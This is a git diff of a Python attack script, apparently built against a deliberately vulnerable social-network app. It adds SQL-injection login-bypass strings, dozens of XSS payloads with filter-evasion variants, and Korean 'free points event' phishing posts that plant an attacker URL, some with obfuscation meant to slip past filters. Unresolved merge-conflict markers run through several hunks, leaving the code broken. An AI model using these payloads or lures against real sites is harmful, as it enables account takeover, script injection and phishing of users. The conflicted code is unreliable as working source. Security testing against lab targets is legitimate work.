@@ -358,6 +358,13 @@ class VulnerableSNSAttacker:
             ("admin", "admin'--", 'Simple comment out'),
             ("admin", "admin'#", 'Hash comment out'),
             ("admin", "admin'/*", 'Block comment out'),
+            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
+            ('admin" --', 'anything', 'Comment out password'),
+            ("admin' --", 'anything', 'Single quote comment out password'),
+            ("admin", "' OR 1=1--", 'Single quote no space comment'),
+            ("admin", "' OR '1'='1' #", 'Single quote with hash comment'),
+            ("admin", "' OR 1=1#", 'Single quote numeric with hash'),
+            ("admin' OR '1'='1' --", 'password', 'Username field single quote injection'),
         ]
         
         for username, password, desc in payloads:
@@ -778,6 +785,7 @@ if(isset($_GET["cmd"])) {
 
         print(f"\n[*] LFI/RCE Results: {success_count} successful operations")
         return success_count > 0
+<<<<<<< HEAD
 
     def test_sql_injection_advanced(self):
         """Advanced SQL Injection tests on various endpoints after login"""
@@ -1307,6 +1315,9 @@ if(isset($_GET["cmd"])) {
         print("[-] No destructive SQL Injection succeeded")
         return False
 
+=======
+    
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
     def clear_old_posts(self):
         """Check and optionally clear old posts with incorrect attacker server URLs"""
         self.print_section("Checking for Old Posts")
@@ -1364,6 +1375,7 @@ if(isset($_GET["cmd"])) {
 
         post_url = f"{self.base_url}/new_post.php"
 
+<<<<<<< HEAD
         # XSS payloads to test - extensive evasion techniques
         xss_payloads = [
             # Basic payloads
@@ -1467,6 +1479,18 @@ if(isset($_GET["cmd"])) {
             # Data URL
             ('<script src="data:text/javascript,alert(1)"></script>', 'Data URL script'),
             ('<img src="data:image/svg+xml,<svg onload=alert(1)>">', 'Data URL SVG'),
+=======
+        # XSS payloads to test
+        xss_payloads = [
+            ('<script>alert("XSS")</script>', 'Basic script tag'),
+            ('<img src=x onerror=alert("XSS")>', 'Image onerror event'),
+            ('<svg/onload=alert("XSS")>', 'SVG onload event'),
+            ('"><script>alert("XSS")</script>', 'Breaking out of attribute'),
+            ('<iframe src="javascript:alert(\'XSS\')"></iframe>', 'Iframe javascript protocol'),
+            ('<body onload=alert("XSS")>', 'Body onload'),
+            ('<input onfocus=alert("XSS") autofocus>', 'Input autofocus'),
+            ('<marquee onstart=alert("XSS")>', 'Marquee onstart'),
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         ]
 
         xss_found = False
@@ -1484,6 +1508,7 @@ if(isset($_GET["cmd"])) {
                 headers['Origin'] = self.base_url
                 headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
+<<<<<<< HEAD
                 print(f"    Sending data: {data}")
                 response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)
 
@@ -1501,6 +1526,11 @@ if(isset($_GET["cmd"])) {
                 # Check if redirected back to new_post (failed)
                 if 'new_post' in response.url:
                     print(f"    Warning: Redirected back to new_post page - submission likely rejected")
+=======
+                response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)
+
+                print(f"    Status: {response.status_code}")
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
 
                 # Check if payload is reflected without sanitization
                 time.sleep(0.5)
@@ -1580,11 +1610,16 @@ if(isset($_GET["cmd"])) {
 
         # Try multiple payload variations to bypass filters
         payloads_to_try = [
+<<<<<<< HEAD
             # Warm-up posts (establish legitimacy)
             (f'''안녕하세요! 좋은 하루 되세요 😊''', 'Innocent warm-up post'),
             (f'''오늘 날씨 좋네요!''', 'Weather comment'),
 
             # Direct link variations
+=======
+            (f'''안녕하세요! 좋은 하루 되세요 😊''', 'Innocent warm-up post'),
+
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
             (f'''🎁 무료 포인트 이벤트
 링크: {attacker_url}
 서두르세요!''', 'Direct link with emojis'),
@@ -1594,6 +1629,7 @@ if(isset($_GET["cmd"])) {
 참여 부탁드립니다''', 'Simple announcement'),
 
             (f'''이벤트 링크: {attacker_url}''', 'Simple link'),
+<<<<<<< HEAD
 
             # Link obfuscation attempts
             (f'''포인트 이벤트: {attacker_url.replace("http://", "")}''', 'No http prefix'),
@@ -1646,6 +1682,8 @@ if(isset($_GET["cmd"])) {
             # Reversed words (creative)
             (f'''tneve tniop eerf
 {attacker_url}''', 'Reversed text'),
+=======
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         ]
 
         for payload, desc in payloads_to_try:
@@ -1662,12 +1700,16 @@ if(isset($_GET["cmd"])) {
                 headers['Origin'] = self.base_url
                 headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
+<<<<<<< HEAD
                 print(f"    Sending data: {data}")
+=======
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)
 
                 print(f"    Status Code: {response.status_code}")
                 print(f"    Final URL: {response.url}")
                 print(f"    Response Length: {len(response.text)}")
+<<<<<<< HEAD
                 print(f"    Response preview: {response.text[:300]}")
 
                 # Check if redirected back to new_post (failed)
@@ -1680,6 +1722,8 @@ if(isset($_GET["cmd"])) {
                     error_msg = soup.find(class_=re.compile(r'error|alert|warning'))
                     if error_msg:
                         print(f"    Error detected: {error_msg.get_text(strip=True)[:150]}")
+=======
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
 
                 # Check for WAF/error messages
                 if 'block' in response.text.lower() or 'forbidden' in response.text.lower() or 'denied' in response.text.lower():
